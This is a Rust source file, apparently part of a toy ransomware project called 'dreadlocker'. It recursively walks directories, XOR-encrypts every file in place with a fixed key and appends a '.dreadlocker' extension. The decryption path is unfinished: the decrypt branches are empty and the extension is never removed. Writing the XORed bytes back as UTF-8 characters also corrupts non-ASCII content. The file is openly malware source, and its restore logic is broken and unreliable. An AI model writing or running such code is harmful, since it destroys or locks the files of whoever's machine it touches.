use std::fs::{self, OpenOptions};
use std::io::{Read, Write, SeekFrom, Seek};
use std::path::PathBuf;
use std::process;

use crate::settings::Config;
pub fn iterate_dir(path: &str, config: &Config) {
    let file_list = fs::read_dir(path).unwrap_or_else(|err| {
        eprintln!("Error reading {}'s content: {}",path, err);
        process::exit(1);
    });
    for file in file_list {
        let path = file.as_ref().unwrap().path();
        if let Ok(metadata) = path.metadata() {
            match metadata.is_file() {
                true => {
                    if config.decrypt(){

                    } else {
                        println!("Encrypting '{}'", path.display());
                        encrypt_file(file.unwrap().path(), &config);
                    }
                },
                false => {
                    if config.decrypt(){

                    } else {
                        println!("'{}' is a folder, encrypting...", path.display());
                        iterate_dir(&path.into_os_string().into_string().unwrap(), &config);
                    }
                    
                    
                }
            }
        }
        
    }
}

pub fn encrypt_file(file_path: PathBuf, config: &Config) {
    let mut file = OpenOptions::new()
    .read(true)
    .write(true)
    .create(true)
    .open(file_path.clone()).unwrap_or_else(|err| {
        eprintln!("Error opening {} : {}", file_path.display(), err);
        process::exit(1);
    });
    let mut contents = String::new();
    let reading_done = file.read_to_string(&mut contents);
    if reading_done.is_err() {
        eprintln!("Error reading {} : {}",file_path.as_path().as_os_str().to_str().unwrap(), reading_done.unwrap());
    }
    else {
        //println!("Content before encryption: {}", contents);
        match config.get_enc_type() {
            1 => { // TODO: other encryption type
                println!("Type 1 encryption is not yet implemented. Exiting...");
                process::exit(0);
            },
            _ => { // 0 or anything else => simple XOR
                add_extension(&file_path);
                let xor_number: u8 = 5;
                let mut result: String = String::new();
                for i in contents.as_bytes().iter(){
                    let value = *i^xor_number;
                    // println!("Value : {} towards {}", i, value);
                    result.push(char::from(value));
                }
                file.seek(SeekFrom::Start(0)).unwrap();
                file.write_all(result.as_bytes()).unwrap_or_else(|err| {
                    eprintln!("Error overwriting {}: {}. Sufficient permissions?",&file_path.display(), err);
                });
            }
        }
    }
    
}
pub fn decrypt_file(file_path: PathBuf, config: &Config) {
    let mut file = OpenOptions::new()
    .read(true)
    .write(true)
    .create(true)
    .open(file_path.clone()).unwrap_or_else(|err| {
        eprintln!("Error opening {} : {}", file_path.display(), err);
        process::exit(1);
    });
    let mut contents = String::new();
    let reading_done = file.read_to_string(&mut contents);
    if reading_done.is_err() {
        eprintln!("Error reading {} : {}",file_path.as_path().as_os_str().to_str().unwrap(), reading_done.unwrap());
    }
    else {
        //println!("Content before encryption: {}", contents);
        match config.get_enc_type() {
            1 => { // TODO: other encryption type
                println!("Type 1 encryption is not yet implemented. Exiting...");
                process::exit(0);
            },
            _ => { // 0 or anything else => simple XOR
                del_extension(&file_path);
                let xor_number: u8 = 5;
                let mut result: String = String::new();
                for i in contents.as_bytes().iter(){
                    let value = *i^xor_number;
                    // println!("Value : {} towards {}", i, value);
                    result.push(char::from(value));
                }
                file.seek(SeekFrom::Start(0)).unwrap();
                file.write_all(result.as_bytes()).unwrap_or_else(|err| {
                    eprintln!("Error overwriting {}: {}. Sufficient permissions?",&file_path.display(), err);
                });
            }
        }
    }
    
}

fn add_extension(file_path: &PathBuf) {
    let name = file_path.as_path().as_os_str().to_str().unwrap();
    let mut new_name = String::from(name);
    new_name.push_str(".dreadlocker");
    fs::rename(name,new_name).unwrap_or_else(|err| {
        eprintln!("Error appending the extension to {}: {}", name, err);
    });
}
fn del_extension(file_path: &PathBuf) {
    let name = file_path.as_path().as_os_str().to_str().unwrap();
    let mut new_name = String::from(name);
    let res = new_name.find(".dreadlocker");
    //TODO : remove extension
    fs::rename(name,new_name).unwrap_or_else(|err| {
        eprintln!("Error appending the extension to {}: {}", name, err);
    });
}